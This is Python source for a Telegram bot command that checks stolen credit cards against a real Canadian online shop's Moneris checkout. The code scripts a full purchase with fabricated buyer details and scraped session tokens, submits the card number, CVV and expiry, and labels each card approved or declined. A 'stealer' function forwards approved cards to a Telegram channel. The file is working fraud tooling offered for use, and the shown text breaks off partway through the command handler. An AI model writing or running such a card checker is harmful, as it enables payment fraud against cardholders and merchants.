import time
import asyncio
import re
import os
import random
import string
import warnings
import requests
from urllib3.exceptions import InsecureRequestWarning
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Moneris - Sonography Canada"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# Owner DM Link (clickable ㊕)
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

# Stealer channel ID (adjust if needed)
STEALER_CHANNEL_ID = -1003627495953

warnings.filterwarnings('ignore', category=InsecureRequestWarning)

# -------------------------------------------------------------
# Helper functions (synchronous, from original script)
# -------------------------------------------------------------
def generate_email():
    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=12))
    return f"{name}@{random.choice(domains)}"

def generate_name():
    first = random.choice(["James","Michael","William","David","John","Robert","Richard","Thomas","Daniel","Anthony","Christopher","Matthew","Andrew","Joshua","Kevin"])
    last = random.choice(["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson"])
    return first, last

def generate_address():
    streets = ["Maple","Oak","Pine","Cedar","Elm","Birch","Willow","Cherry","Spruce","Aspen","Main","Washington","Lake","Hill","Park"]
    nums = random.randint(1000, 9999)
    types = ["St","Ave","Rd","Blvd","Dr","Ln","Way","Ct","Pl"]
    return f"{nums} {random.choice(streets)} {random.choice(types)}"

def generate_phone():
    return f"{random.randint(200,999)}-{random.randint(100,999)}-{random.randint(1000,9999)}"

def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    if len(digits) < 13:
        return False
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        d *= 2
        if d > 9:
            d -= 9
        total += d
    return total % 10 == 0

def get_card_type(card_number):
    if card_number.startswith('4'):
        return '1'
    elif card_number.startswith(('51','52','53','54','55')) or (len(card_number) >= 6 and 222100 <= int(card_number[:6]) <= 272099):
        return '1'
    elif card_number.startswith(('34','37')):
        return '3'
    elif card_number.startswith('6'):
        return '4'
    return '1'

def get_error_msg(text):
    err = re.search(r'<div class="dn-alert dn-page-alert dn-error">([^<<]+)</div>', text)
    if err:
        return err.group(1).strip()
    err2 = re.search(r'dn-error[^>]*>([^<<]+)</div>', text)
    if err2:
        return err2.group(1).strip()
    err3 = re.search(r'Processor Decline:([^<<]+)', text)
    if err3:
        return err3.group(1).strip()
    return None

# -------------------------------------------------------------
# Core synchronous check (modified to return status/message)
# -------------------------------------------------------------
def check_card_sync(cc, mm, yy, cvv):
    """Returns (status, message)"""
    if not luhn_check(cc):
        return "Declined ❌", "Luhn Algorithm Failed"
    
    s = requests.Session()
    s.verify = False
    
    first, last = generate_name()
    email = generate_email()
    address = generate_address()
    phone = generate_phone()
    card_type = get_card_type(cc)
    
    try:
        # Step 1: Get initial tokens
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-prototype-version': '9.5.1.1',
            'x-requested-with': 'XMLHttpRequest',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/', headers=headers)
        pcsid = re.search(r'var\s+pcSID\s*=\s*"([^"]+)"', response.text).group(1)
        pcs = re.search(r'var\s+pcSKey\s*=\s*"([^"]+)"', response.text).group(1)
        csrf = re.search(r'var\s+dnCSRFToken\s*=\s*"([^"]+)"', response.text).group(1)
        
        # Step 2: Add product to cart (designer/save_product)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://sonography-canada.secure-decoration.com',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/view_product/24583436/Gildan-Unisex-Colourful-Bilingual-Printed-T-Shirt',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': csrf,
            'x-prototype-version': '9.5.1.1',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = [
            ('for_view', '1'),
            ('is_new', '1'),
            ('dmode', '4'),
            ('dnssv', '3'),
            ('_cstack', 'function-CP_checkForAlerts-CP_saveFromView-onclick'),
            ('dnssv', '3'),
        ]
        data = {
            'c[3494309171][custom_name]': '0',
            'c[3494309171][brid]': '21199316',
            'c[3494309171][clid]': '-2',
            'c[3494309171][cid]': '-1',
            'c[3494309171][p]': '303351251',
            'c[3494309171][q]': '1',
            'c[3494309171][lv]': '29596075100',
            'c[3494309171][c]': '8563853',
            'c[3494309171][def_proc]': '-1',
            'c[3494309171][screen_method]': '1',
            'c[3494309171][is_sdp]': 'true',
            'c[3494309171][cp]': '24583436',
            'c[3494309171][f][2][o][2][q]': '1',
            'c[3494309171][f][2][o][2][up]': '19.99',
            'c[3494309171][f][2][o][2][ud]': '0',
            'c[3494309171][f][2][o][2][iap]': 'true',
            'c[3494309171][v][1947283][rv]': '29596075100',
            'c[3494309171][v][1947283][pos]': '1',
            'c[3494309171][v][1947283][a][896988][rv]': '29596074902',
            'c[3494309171][v][1947283][a][896988][pos]': '1',
            'c[3494309171][v][1947283][a][896988][bg]': 'transparent&0&0&0&0&0&0&100&transparent&&&%7B%7D&1',
            'c[3494309171][v][1947283][a][896988][p][26][rv]': '29596074902',
            'c[3494309171][v][1947283][a][896988][p][26][uod]': 'false',
            'c[3494309171][v][1947283][a][896988][p][26][uoc]': 'false',
            'c[3494309171][v][1947283][a][896988][i][1][id]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][p]': '26',
            'c[3494309171][v][1947283][a][896988][i][1][rv]': '29596074902',
            'c[3494309171][v][1947283][a][896988][i][1][prv]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][use_dnt]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][src_cpa_id]': '1657616601',
            'c[3494309171][v][1947283][a][896988][i][1][src_v]': '26937631902',
            'c[3494309171][v][1947283][a][896988][i][1][lk]': 'false',
            'c[3494309171][v][1947283][a][896988][i][1][lkt]': 'false',
            'c[3494309171][v][1947283][a][896988][i][1][w]': '3001.006002012004',
            'c[3494309171][v][1947283][a][896988][i][1][h]': '1052.002104004208',
            'c[3494309171][v][1947283][a][896988][i][1][l]': '436.3627636363637',
            'c[3494309171][v][1947283][a][896988][i][1][t]': '518.1807818181819',
            'c[3494309171][v][1947283][a][896988][i][1][z]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][it]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][iv]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][taid]': '610311811',
            'c[3494309171][v][1947283][a][896988][i][1][per]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][perc]': 'Set Image',
            'c[3494309171][v][1947283][a][896988][i][1][aid]': '610311811',
            'c[3494309171][v][1947283][a][896988][i][1][use_canvas]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][dnt_group_id]': 'dgi-9irozuq',
            'c[3494309171][v][1947283][a][896988][i][1][flip_x]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][flip_y]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][rot]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][ar]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][rw]': '3001.006002012004',
            'c[3494309171][v][1947283][a][896988][i][1][rh]': '1052.002104004208',
            'c[3494309171][v][1947283][a][896988][i][1][cc]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][lcc]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][dig]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][par]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][pac]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][pacc]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][b]': '0',
            'c[3494309171][v][1947283][a][896988][i][1][tc]': 'transparent%260%260%260%260%260%260%26100%26transparent%26%26%26%257B%257D%261',
            'c[3494309171][v][1947283][a][896988][i][1][usage_qty]': '1',
            'c[3494309171][v][1947283][a][896988][i][1][cw]': '0',
            '_': '',
        }
        response = s.post('https://sonography-canada.secure-decoration.com/designer/save_product', params=params, headers=headers, data=data)
        
        # Step 3: Get cart info
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/view_product/24583436/Gildan-Unisex-Colourful-Bilingual-Printed-T-Shirt',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': csrf,
            'x-prototype-version': '9.5.1.1',
            'x-requested-with': 'XMLHttpRequest',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/cart_info', headers=headers)
        
        # Step 4: Verify cart (first)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/view_product/24583436/Gildan-Unisex-Colourful-Bilingual-Printed-T-Shirt',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
            'escape': 'false',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/verify', params=params, headers=headers)
        
        # Step 5: Verify again (different params)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'if-none-match': 'W/"4912884732fcfe029e5c61f9147af198"',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/view_product/24583436/Gildan-Unisex-Colourful-Bilingual-Printed-T-Shirt',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            'escape': 'false',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/verify', params=params, headers=headers)
        pcsid = re.search(r'var\s+pcSID\s*=\s*"([^"]+)"', response.text).group(1)
        pcs = re.search(r'var\s+pcSKey\s*=\s*"([^"]+)"', response.text).group(1)
        csrf = re.search(r'var\s+dnCSRFToken\s*=\s*"([^"]+)"', response.text).group(1)
        
        # Step 6: Address page
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/verify?escape=false',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/address', params=params, headers=headers)
        
        # Step 7: Address page (again, to get tokens)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/verify?escape=false',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/address', headers=headers)
        pcsid = re.search(r'var\s+pcSID\s*=\s*"([^"]+)"', response.text).group(1)
        pcs = re.search(r'var\s+pcSKey\s*=\s*"([^"]+)"', response.text).group(1)
        csrf = re.search(r'var\s+dnCSRFToken\s*=\s*"([^"]+)"', response.text).group(1)
        auth = re.search(r'name="authenticity_token".*?value="([^"]+)"', response.text).group(1)
        org = re.search(r'name="origin_signature".*?value="([^"]+)"', response.text).group(1)
        
        # Step 8: Update address (shipping)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://sonography-canada.secure-decoration.com',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/address?gld=1779190307.1864&is=1',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
        }
        data = {
            'authenticity_token': auth,
            'origin_signature': org,
            'goto': 'shipping',
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
            'newuser[firstname]': f'{first} {last}',
            'newuser[lastname]': last,
            'newuser[email]': email,
            'cf[44468][0][803841]': f'{first} {last}',
            'newuser[address]': address,
            'newuser[city]': 'Kingston',
            'newuser[country_id]': '36',
            'newuser[state]': 'Ontario',
            'newuser[post_code]': 'M9G 4O0',
            'newuser[phone_number]': phone,
            'newuser[refund_policy]': '1',
            'newuser[t_and_c]': '1',
            'newuser[newsletter]': '1',
            'cf[44468][0][801871][6077021]': '1',
            'use_shipping': '',
            'shipping_detail[firstname]': '',
            'shipping_detail[lastname]': '',
            'cf[44468][1][803841]': '',
            'shipping_detail[address]': '',
            'shipping_detail[city]': '',
            'shipping_detail[country_id]': '36',
            'shipping_detail[state]': '',
            'shipping_detail[post_code]': '',
            'shipping_detail[phone_number]': '',
        }
        response = s.post('https://sonography-canada.secure-decoration.com/shop/update_address', params=params, headers=headers, data=data)
        
        # Step 9: Shipping page
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/address?gld=1779190307.1864&is=1',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            'gld': '1779190404.1406',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/shipping', params=params, headers=headers)
        pcsid = re.search(r'var\s+pcSID\s*=\s*"([^"]+)"', response.text).group(1)
        pcs = re.search(r'var\s+pcSKey\s*=\s*"([^"]+)"', response.text).group(1)
        csrf = re.search(r'var\s+dnCSRFToken\s*=\s*"([^"]+)"', response.text).group(1)
        auth = re.search(r'name="authenticity_token".*?value="([^"]+)"', response.text).group(1)
        org = re.search(r'name="origin_signature".*?value="([^"]+)"', response.text).group(1)
        
        # Step 10: Update shipping
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://sonography-canada.secure-decoration.com',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/shipping?gld=1779190404.1406',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
        }
        data = {
            'authenticity_token': auth,
            'origin_signature': org,
            'goto': 'billing',
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
            'f[0]': '2029701',
            'cart[customer_notes]': '',
        }
        response = s.post('https://sonography-canada.secure-decoration.com/shop/update_shipping', params=params, headers=headers, data=data)
        
        # Step 11: Billing page
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/shipping?gld=1779190404.1406',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            'gld': '1779190705.3086',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/billing', params=params, headers=headers)
        pcsid = re.search(r'var\s+pcSID\s*=\s*"([^"]+)"', response.text).group(1)
        pcs = re.search(r'var\s+pcSKey\s*=\s*"([^"]+)"', response.text).group(1)
        csrf = re.search(r'var\s+dnCSRFToken\s*=\s*"([^"]+)"', response.text).group(1)
        auth = re.search(r'name="authenticity_token".*?value="([^"]+)"', response.text).group(1)
        org = re.search(r'name="origin_signature".*?value="([^"]+)"', response.text).group(1)
        
        # Step 12: Update billing (submit payment)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://sonography-canada.secure-decoration.com',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/billing?gld=1779190705.3086',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
        }
        data = {
            'authenticity_token': auth,
            'origin_signature': org,
            'goto': 'confirm',
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
            'cart[payment_method]': '321326',
            'card[name]': f'{first} {last}',
            'card[card_type]': card_type,
            'card[card_number]': cc,
            'card[cv2]': cvv,
            'card[expiry_date_year]': yy,
            'card[expiry_date_month]': mm,
            'pa[firstname]': f'{first} {last}',
            'pa[lastname]': last,
            'pa[address]': address,
            'pa[city]': 'Kingston',
            'pa[state]': 'Ontario',
            'pa[postcode]': 'M9G 4O0',
            'pa[country_id]': '36',
        }
        response = s.post('https://sonography-canada.secure-decoration.com/shop/update_billing', params=params, headers=headers, data=data)
        
        # Step 13: Confirm page
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/billing?gld=1779190705.3086',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            'gld': '1779190842.791',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/confirm', params=params, headers=headers)
        auth = re.search(r'name="authenticity_token".*?value="([^"]+)"', response.text).group(1)
        
        # Step 14: Complete order
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://sonography-canada.secure-decoration.com',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/confirm?gld=1779190842.791',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
        }
        data = {
            'authenticity_token': auth,
            '_pc_session_id': pcsid,
            '_pc_skey': pcs,
        }
        response = s.post('https://sonography-canada.secure-decoration.com/shop/complete_order', params=params, headers=headers, data=data)
        
        # Step 15: Checkout status
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/confirm?gld=1779190842.791',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        params = {
            'gld': '1779190928.3841',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/checkout_status', params=params, headers=headers)
        
        # Step 16: Final billing page (error extraction)
        headers = {
            'authority': 'sonography-canada.secure-decoration.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://sonography-canada.secure-decoration.com/shop/checkout_status?gld=1779190928.3841',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
        }
        params = {
            'lte': '1',
            'txid': '46461451',
        }
        response = s.get('https://sonography-canada.secure-decoration.com/shop/billing', params=params, headers=headers)
        
        error_msg = get_error_msg(response.text)
        
        if error_msg:
            return "Declined ❌", error_msg
        else:
            return "Approved ✅", "Transaction Approved"
            
    except Exception as e:
        return "Error", str(e)[:50]

# -------------------------------------------------------------
# Stealer function (keeps owner line – change if needed)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper with run_in_executor (for older Python)
# -------------------------------------------------------------
async def call_moneris_api(fullcc):
    parts = fullcc.split('|')
    if len(parts) != 4:
        return "Error", "Invalid format"
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    loop = asyncio.get_running_loop()
    status, msg = await loop.run_in_executor(None, check_card_sync, cc, mm, yy, cvv)
    return status, msg

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/mo)
# -------------------------------------------------------------
@Client.on_message(filters.command("mo", [".", "/"]))
async def moneris_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mo

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /mo cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
